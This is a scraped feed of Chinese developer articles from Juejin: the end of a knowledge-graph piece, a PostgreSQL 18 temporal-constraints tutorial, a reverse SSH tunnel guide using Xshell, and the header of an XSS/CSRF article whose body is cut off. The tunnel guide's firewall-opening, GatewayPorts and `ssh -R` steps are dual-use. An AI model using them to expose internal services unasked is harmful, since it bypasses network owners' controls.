<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec2f13b3260441b3ac330c80166eda47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=jinsXzLFbIoOUgX%2FJVYOHb%2BSj8M%3D" alt="图片" loading="lazy"/></p>
<p>知识图谱在AI产品中的应用非常广泛:比如在“智能搜索”中，知识图谱能帮用户快速获取“关联信息”(如搜索“北京”时，不仅显示北京的基本信息，还会关联“故宫”“长城”等景点)。</p>
<p>在“金融风控”中，知识图谱能通过分析“企业-法人-关联公司”的关系网络，识别潜在的欺诈风险。</p>
<p>对产品经理而言，知识图谱是提升A1“逻辑推理能力”和“信息组织能力”的关键技术，尤其适合需要“深度关联分析”的场景。</p>
<p>更多AI大模型学习视频及资源，都在<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PostgreSQL 18 - 时间约束 (Temporal Constraints)]]></title>    <link>https://juejin.cn/post/7577042851080142891</link>    <guid>https://juejin.cn/post/7577042851080142891</guid>    <pubDate>2025-11-27T07:36:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851080142891" data-draft-id="7576955345379393599" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PostgreSQL 18 - 时间约束 (Temporal Constraints)"/> <meta itemprop="keywords" content="PostgreSQL,数据库,开源"/> <meta itemprop="datePublished" content="2025-11-27T07:36:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IvorySQL"/> <meta itemprop="url" content="https://juejin.cn/user/761327331579511"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PostgreSQL 18 - 时间约束 (Temporal Constraints)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/761327331579511/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IvorySQL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:36:00.000Z" title="Thu Nov 27 2025 07:36:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>PostgreSQL 18 引入了一项强大的新功能，允许你在时间段内强制执行唯一性：<strong>时间约束（Temporal Constraints）</strong>。通过这一新增功能，你现在可以在定义 <code>UNIQUE</code>、<code>PRIMARY KEY</code> 或 <code>FOREIGN KEY</code> 约束时，利用日期范围（Date Range）或时间戳范围（Timestamp Range）字段，比以往更容易地防止数据重叠。</p>
<h2 data-id="heading-0">问题所在：基于时间的唯一性</h2>
<p>在最新的这个版本中，PostgreSQL 增加了一种更灵活的方式来定义 <code>UNIQUE</code>、<code>PRIMARY KEY</code> 和 <code>FOREIGN KEY</code> 约束。我将把示例重点放在 <code>UNIQUE</code> 约束上，因为这在我看来是时间约束最有用的场景。</p>
<p>让我们从一个现实世界的场景开始：管理用户订阅。</p>
<h3 data-id="heading-1">设置示例</h3>
<p>首先，我们有一个简单的 <code>users</code> 表，包含 2 行数据：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
  id uuid <span class="hljs-keyword">DEFAULT</span> uuidv7() <span class="hljs-keyword">PRIMARY</span> KEY,
  email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (email) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'darth@example.com'</span>),
(<span class="hljs-string">'luke@example.com'</span>);
</code></pre>
<h3 data-id="heading-2">使用 WITHOUT OVERLAPS 的时间约束</h3>
<p>现在我想创建一个属于 <code>users</code> 表的 <code>subscriptions</code>（订阅）表。每个订阅都有开始和结束日期，我想确保每个用户的订阅是唯一的。用户可以有过去的订阅（也许他们升级了层级），但在任何给定的时间点只能有一个活跃的订阅。</p>
<p>以下是我们如何使用新的 <code>WITHOUT OVERLAPS</code> 语法来强制执行此操作：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> subscriptions (
  user_id uuid <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  type <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  valid_period daterange <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">FOREIGN</span> KEY (user_id) <span class="hljs-keyword">REFERENCES</span> users(id),
  <span class="hljs-keyword">UNIQUE</span> (user_id, valid_period <span class="hljs-keyword">WITHOUT</span> <span class="hljs-keyword">OVERLAPS</span>)
);
</code></pre>
<p>如你所见，我们在 <code>valid_period</code> 这个 <code>daterange</code> 字段的 <code>UNIQUE</code> 约束中使用了 <code>WITHOUT OVERLAPS</code>。时间约束要求键列（<code>valid_period</code>）必须是范围类型（range type），因此通常你会使用 <code>daterange</code> 或 <code>timestamprange</code>，但它也适用于其他范围类型。</p>
<h3 data-id="heading-3">测试一下</h3>
<p>让我们插入一些数据：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> subscriptions (user_id, type, valid_period)
<span class="hljs-keyword">SELECT</span> u.id, <span class="hljs-string">'basic'</span>, daterange(<span class="hljs-string">'2024-01-01'</span>, <span class="hljs-string">'2025-01-01'</span>, <span class="hljs-string">'[)'</span>)
<span class="hljs-keyword">FROM</span> users u;

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> subscriptions (user_id, type, valid_period)
<span class="hljs-keyword">SELECT</span> u.id, <span class="hljs-string">'premium'</span>, daterange(<span class="hljs-string">'2025-01-01'</span>, <span class="hljs-string">'2026-01-01'</span>, <span class="hljs-string">'[)'</span>)
<span class="hljs-keyword">FROM</span> users u
<span class="hljs-keyword">WHERE</span> u.email <span class="hljs-operator">=</span> <span class="hljs-string">'darth@example.com'</span>;

<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> subscriptions;
</code></pre>
<p>结果如下：</p>
<pre><code class="hljs language-text" lang="text">               user_id                |  type   |      valid_period
--------------------------------------+---------+-------------------------
 0199f293-291a-70bf-b9ee-872247723d29 | basic   | [2024-01-01,2025-01-01)
 0199f293-291b-737a-9bd0-e0e0853e3377 | basic   | [2024-01-01,2025-01-01)
 0199f293-291a-70bf-b9ee-872247723d29 | premium | [2025-01-01,2026-01-01)
</code></pre>
<p>在这个例子中，Luke 显然在 2025 年停止了付费，而 Darth 升级到了高级版。我通常习惯使用单独的列来表示开始和结束日期，但我很欣赏范围类型（Ranges）能够启用此功能，并允许我们使用强大的范围运算符。</p>
<h3 data-id="heading-4">额外内容：查询活跃订阅</h3>
<p>使用“冰淇淋筒”运算符（<code>@&gt;</code>，即包含运算符），我们可以轻松找到特定日期有效的订阅：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> subscriptions
<span class="hljs-keyword">WHERE</span> valid_period @<span class="hljs-operator">&gt;</span> <span class="hljs-string">'2025-01-01'</span>::<span class="hljs-type">date</span>;
</code></pre>
<p>这个查询会告诉我们哪些订阅在 2025 年 1 月 1 日是活跃的。</p>
<h3 data-id="heading-5">重要提示：GIST 与 B-Tree 索引</h3>
<p>有一个陷阱：范围列使用 GIST 索引，而 UUID 列使用 B-Tree 索引。当我运行 <code>CREATE TABLE subscriptions</code> 命令时，我遇到了一个错误。为了解决这个问题，你需要启用以下扩展：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EXTENSION btree_gist;
</code></pre>
<h2 data-id="heading-6">了解更多</h2>
<p>如果你想深入了解时间约束，请查看 PostgreSQL 文档中关于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dhttps%3A%2F%2Fwww.postgresql.org%2Fdocs%2Fdevel%2Fddl-constraints.html%2523DDL-CONSTRAINTS-UNIQUE-WITHOUT-OVERLAPS" target="_blank" title="https://www.google.com/search?q=https://www.postgresql.org/docs/devel/ddl-constraints.html%23DDL-CONSTRAINTS-UNIQUE-WITHOUT-OVERLAPS" ref="nofollow noopener noreferrer">WITHOUT OVERLAPS</a> 的部分。</p>
<p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhashrocket.com%2Fblog%2Fposts%2Fpostgresql-18-temporal-constraints" target="_blank" title="https://hashrocket.com/blog/posts/postgresql-18-temporal-constraints" ref="nofollow noopener noreferrer">hashrocket.com/blog/posts/…</a></p>
<p>作者：Vinicius Negrisolo</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何通过xshell实现建立反向隧道，通过云服务器的访问本地服务]]></title>    <link>https://juejin.cn/post/7576968345875808283</link>    <guid>https://juejin.cn/post/7576968345875808283</guid>    <pubDate>2025-11-27T07:54:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875808283" data-draft-id="7576968345875234843" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何通过xshell实现建立反向隧道，通过云服务器的访问本地服务"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-27T07:54:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dyw08"/> <meta itemprop="url" content="https://juejin.cn/user/2174157519593227"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何通过xshell实现建立反向隧道，通过云服务器的访问本地服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2174157519593227/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dyw08
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:54:04.000Z" title="Thu Nov 27 2025 07:54:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>1、选择云服务器上面一个端口，比如8015，如果是阿里云需要把安全策略打开这个端口，允许外部放这个端口地址，如图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f48bc6d3ed143b2ab43d725d3a8a609~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=muN%2F6a6%2FMx6LQ7A4m429luXr8JM%3D" alt="image.png" loading="lazy"/></p>
<p>2、通过xshell登陆到云服务器上面，如果防火墙是打开的，需要执行以下命令</p>
<h2 data-id="heading-0">检查防火墙状态</h2>
<pre><code class="hljs language-lua" lang="lua">systemctl <span class="hljs-built_in">status</span> firewalld
</code></pre>
<h2 data-id="heading-1">放行8015端口（如果防火墙开启）</h2>
<pre><code class="hljs language-css" lang="css">firewall-cmd <span class="hljs-attr">--add-port</span>=<span class="hljs-number">8015</span>/tcp <span class="hljs-attr">--permanent</span>
firewall-cmd <span class="hljs-attr">--reload</span>
</code></pre>
<h2 data-id="heading-2">查看防火墙当前开放的所有端口</h2>
<pre><code class="hljs language-css" lang="css">firewall-cmd <span class="hljs-attr">--list-ports</span>
</code></pre>
<p>3、 检查SSH服务配置（关键！）</p>
<pre><code class="hljs language-bash" lang="bash">编辑 /etc/ssh/sshd_config 
</code></pre>
<h2 data-id="heading-3">必须开启的配置</h2>
<h2 data-id="heading-4">允许外部访问转发端口</h2>
<pre><code class="hljs language-bash" lang="bash">GatewayPorts <span class="hljs-built_in">yes</span> 
</code></pre>
<h2 data-id="heading-5">允许端口转发</h2>
<pre><code class="hljs language-bash" lang="bash">AllowTcpForwarding <span class="hljs-built_in">yes</span>
</code></pre>
<h2 data-id="heading-6">重启SSH服务</h2>
<pre><code class="hljs">systemctl restart sshd
</code></pre>
<p>4、本地xshell隧道配置</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c262348e4854e21b18434b3adfe0fb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=rZf2xp51CDsJlCRL0WaXVBm84qE%3D" alt="image.png" loading="lazy"/></p>
<p>选择远程传入方式，然后源主机输入云服务器ip，端口选择上面配置的端口，如8015；目标主机填写需要代理过去的ip，如 127.0.0.1 或者内网IP ,目标端口为你自己程序需要访问的端口，如图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99e87ef4fae8420fa71e82f041fad4d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=5p8S3Caa5FfZ8ao0yBpHQILt9Ug%3D" alt="image.png" loading="lazy"/></p>
<p>5、window系统中启动cmd命令，执行如下命令：</p>
<h2 data-id="heading-7">从本地机器执行（注意方向！）</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">ssh -R <span class="hljs-number">8015</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8014</span> <span class="hljs-symbol">username@</span><span class="hljs-number">139.</span>*.*<span class="hljs-number">.164</span>
</code></pre>
<p>这一步就是把本地8014端口和云服务器的8015的访问请求绑定在一起了</p>
<h2 data-id="heading-8">保持ssh长时间链接命令</h2>
<pre><code class="hljs language-ini" lang="ini">ssh -o <span class="hljs-attr">ServerAliveInterval</span>=<span class="hljs-number">60</span> -R <span class="hljs-number">8015</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8014</span> username@ip
</code></pre>
<p>6、开始检测和验证结果</p>
<p>服务器上面执行的：</p>
<h2 data-id="heading-9">查看8015端口监听情况（应显示sshd监听）</h2>
<pre><code class="hljs language-perl" lang="perl">netstat -tuln | <span class="hljs-keyword">grep</span> <span class="hljs-number">8015</span>
</code></pre>
<h2 data-id="heading-10">预期输出：</h2>
<pre><code class="hljs language-ruby" lang="ruby">tcp   <span class="hljs-number">0</span>   <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8015</span>    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:*</span>     <span class="hljs-variable constant_">LISTEN</span>
</code></pre>
<p>测试联通性：</p>
<h2 data-id="heading-11">在服务器上测试本地转发</h2>
<pre><code class="hljs language-arduino" lang="arduino">curl -v http:<span class="hljs-comment">//127.0.0.1:8015/</span>
</code></pre>
<h2 data-id="heading-12">从其他机器测试公网访问</h2>
<pre><code class="hljs language-arduino" lang="arduino">curl -v http:<span class="hljs-comment">//139.196.111.164:8015/</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e82f73d3087b40b18b70eb224340d024~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=Ks2tDjj6GDAKRjVU3PPrckovtzg%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[关于XSS和CSRF，面试官更喜欢这样的回答！]]></title>    <link>https://juejin.cn/post/7577049352838660111</link>    <guid>https://juejin.cn/post/7577049352838660111</guid>    <pubDate>2025-11-27T07:56:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838660111" data-draft-id="7576942980709695488" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="关于XSS和CSRF，面试官更喜欢这样的回答！"/> <meta itemprop="keywords" content="前端,面试,JavaScript"/> <meta itemprop="datePublished" content="2025-11-27T07:56:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="秀秀不只会前端"/> <meta itemprop="url" content="https://juejin.cn/user/1410009035452887"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" 